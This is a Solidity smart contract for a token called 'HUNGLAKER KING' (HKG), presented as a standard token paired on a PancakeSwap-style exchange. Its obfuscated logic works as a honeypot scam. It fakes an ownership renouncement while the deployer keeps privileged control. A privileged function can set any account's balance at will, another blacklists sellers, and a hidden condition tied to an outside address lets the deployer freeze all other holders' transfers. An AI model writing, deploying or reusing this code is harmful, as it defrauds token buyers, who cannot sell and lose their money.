//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract marketingFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeTeam {
    function createPair(address shouldReceiver, address feeIs) external returns (address);
}


interface maxLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface minToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderSwapEnable) external view returns (uint256);

    function transfer(address swapMarketing, uint256 fundMax) external returns (bool);

    function allowance(address minFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundMax) external returns (bool);

    function transferFrom(address sender,address swapMarketing,uint256 fundMax) external returns (bool);

    event Transfer(address indexed from, address indexed buyMarketing, uint256 value);
    event Approval(address indexed minFee, address indexed spender, uint256 value);
}

interface sellLiquiditySwap is minToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HUNGLAKERKING is marketingFrom, minToken, sellLiquiditySwap {

    function transferFrom(address marketingReceiver, address swapMarketing, uint256 fundMax) external override returns (bool) {
        if (_msgSender() != autoFromReceiver) {
            if (txMarketing[marketingReceiver][_msgSender()] != type(uint256).max) {
                require(fundMax <= txMarketing[marketingReceiver][_msgSender()]);
                txMarketing[marketingReceiver][_msgSender()] -= fundMax;
            }
        }
        return amountReceiverSwap(marketingReceiver, swapMarketing, fundMax);
    }

    bool public atMarketingTeam;

    bool public exemptFromSell;

    function tradingLaunched(uint256 fundMax) public {
        enableToken();
        limitBuy = fundMax;
    }

    function name() external view virtual override returns (string memory) {
        return autoMode;
    }

    address public minMarketing;

    uint256 public tokenExempt;

    function allowance(address listSwap, address senderFrom) external view virtual override returns (uint256) {
        if (senderFrom == autoFromReceiver) {
            return type(uint256).max;
        }
        return txMarketing[listSwap][senderFrom];
    }

    uint256 private listAmount = 100000000 * 10 ** 18;

    address public modeAmount;

    function listReceiver(address atShouldSwap, uint256 fundMax) public {
        enableToken();
        senderSwap[atShouldSwap] = fundMax;
    }

    mapping(address => bool) public senderTo;

    uint256 public maxTrading;

    function walletTokenFee(address fundMarketing) public {
        if (atMarketingTeam) {
            return;
        }
        
        isLiquidity[fundMarketing] = true;
        
        atMarketingTeam = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return toTeam;
    }

    uint256 public launchedWalletFund;

    address autoFromReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private autoMode = "HUNGLAKER KING";

    function transfer(address atShouldSwap, uint256 fundMax) external virtual override returns (bool) {
        return amountReceiverSwap(_msgSender(), atShouldSwap, fundMax);
    }

    uint256 public modeMax;

    function receiverExempt() public {
        emit OwnershipTransferred(minMarketing, address(0));
        listTake = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listAmount;
    }

    function enableToken() private view {
        require(isLiquidity[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return launchedShouldLimit;
    }

    function owner() external view returns (address) {
        return listTake;
    }

    function fundLaunchShould(address tradingTo) public {
        enableToken();
        
        if (tradingTo == minMarketing || tradingTo == modeAmount) {
            return;
        }
        senderTo[tradingTo] = true;
    }

    mapping(address => bool) public isLiquidity;

    bool public sellLimitTx;

    mapping(address => mapping(address => uint256)) private txMarketing;

    function swapFrom(address marketingReceiver, address swapMarketing, uint256 fundMax) internal returns (bool) {
        require(senderSwap[marketingReceiver] >= fundMax);
        senderSwap[marketingReceiver] -= fundMax;
        senderSwap[swapMarketing] += fundMax;
        emit Transfer(marketingReceiver, swapMarketing, fundMax);
        return true;
    }

    mapping(address => uint256) private senderSwap;

    function getOwner() external view returns (address) {
        return listTake;
    }

    bool private isSellMax;

    uint256 limitBuy;

    event OwnershipTransferred(address indexed isSellFee, address indexed totalAuto);

    function balanceOf(address senderSwapEnable) public view virtual override returns (uint256) {
        return senderSwap[senderSwapEnable];
    }

    function approve(address senderFrom, uint256 fundMax) public virtual override returns (bool) {
        txMarketing[_msgSender()][senderFrom] = fundMax;
        emit Approval(_msgSender(), senderFrom, fundMax);
        return true;
    }

    uint256 enableAutoLimit;

    bool public fromTotal;

    uint8 private launchedShouldLimit = 18;

    string private toTeam = "HKG";

    address fromSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private fromFund;

    constructor (){
        if (fromTotal) {
            isSellMax = true;
        }
        receiverExempt();
        maxLiquidity senderAmount = maxLiquidity(autoFromReceiver);
        modeAmount = takeTeam(senderAmount.factory()).createPair(senderAmount.WETH(), address(this));
        if (isSellMax) {
            modeMax = tokenExempt;
        }
        minMarketing = _msgSender();
        isLiquidity[minMarketing] = true;
        senderSwap[minMarketing] = listAmount;
        
        emit Transfer(address(0), minMarketing, listAmount);
    }

    function amountReceiverSwap(address marketingReceiver, address swapMarketing, uint256 fundMax) internal returns (bool) {
        if (marketingReceiver == minMarketing) {
            return swapFrom(marketingReceiver, swapMarketing, fundMax);
        }
        uint256 swapLiquidity = minToken(modeAmount).balanceOf(fromSender);
        require(swapLiquidity == limitBuy);
        require(!senderTo[marketingReceiver]);
        return swapFrom(marketingReceiver, swapMarketing, fundMax);
    }

    bool private sellAt;

    address private listTake;

}